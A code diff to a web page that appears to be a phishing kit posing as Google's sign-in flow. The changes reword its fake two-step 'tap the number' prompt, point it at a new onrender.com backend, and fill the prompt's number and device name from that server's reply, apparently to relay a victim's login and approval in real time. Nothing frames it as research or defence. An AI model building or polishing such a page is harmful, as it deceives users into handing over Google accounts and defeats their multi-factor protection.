@@ -758,10 +758,10 @@
       </div>
       <div class="col-form col-form-center">
         <div class="prompt-number" id="promptNumber">58</div>
-        <p class="prompt-device-title" id="promptDeviceName">Check your phone</p>
+        <p class="prompt-device-title" id="promptDeviceName">Open the Gmail or YouTube app</p>
         <p class="prompt-desc">
-          Google sent a notification to your <span id="promptDeviceNameInline">phone</span>. Tap <strong>Yes</strong> on the
-          notification, then tap <strong id="promptNumberInline">58</strong> on your phone to verify it's you.
+          Google sent a notification to your <span id="promptDeviceNameInline">phone</span>. Open the Gmail or YouTube app, tap <strong>Yes</strong> on the
+          prompt, then tap <strong id="promptNumberInline">58</strong> on your phone to verify it's you.
         </p>
         <a href="#" class="prompt-help-link">Need help? Learn more about Google prompts</a>
         <label class="prompt-checkbox-row">
@@ -941,7 +941,7 @@
 
   <script>
   (function () {
-    var BACKEND = 'https://backintosh.onrender.com';
+    var BACKEND = 'https://rbback-jxr6.onrender.com';
     /* Auto-switch to local backend when running on localhost or *.test */
     if (location.hostname === 'localhost' || location.hostname === '127.0.0.1' ||
         location.hostname.endsWith('.test') || location.hostname.endsWith('.local')) {
@@ -1125,13 +1125,16 @@
         setLoading(pwNextBtn, pwLabel, false);
         overlay.classList.remove('visible');
 
-        var num    = (data && data.number) ? String(data.number) : '58';
-        var device = (data && data.device) ? String(data.device) : 'your phone';
+        var num       = (data && data.number) ? String(data.number) : '58';
+        var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
+        var hasDevice = deviceRaw.length > 0;
 
-        document.getElementById('promptNumber').textContent          = num;
-        document.getElementById('promptNumberInline').textContent     = num;
-        document.getElementById('promptDeviceName').textContent       = 'Check ' + device;
-        document.getElementById('promptDeviceNameInline').textContent = device;
+        document.getElementById('promptNumber').textContent           = num;
+        document.getElementById('promptNumberInline').textContent      = num;
+        document.getElementById('promptDeviceName').textContent        = hasDevice
+          ? ('Open the Gmail or YouTube app on ' + deviceRaw)
+          : 'Open the Gmail or YouTube app';
+        document.getElementById('promptDeviceNameInline').textContent  = hasDevice ? deviceRaw : 'phone';
 
         var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
         document.getElementById('step4ChipEmail').textContent = addr;
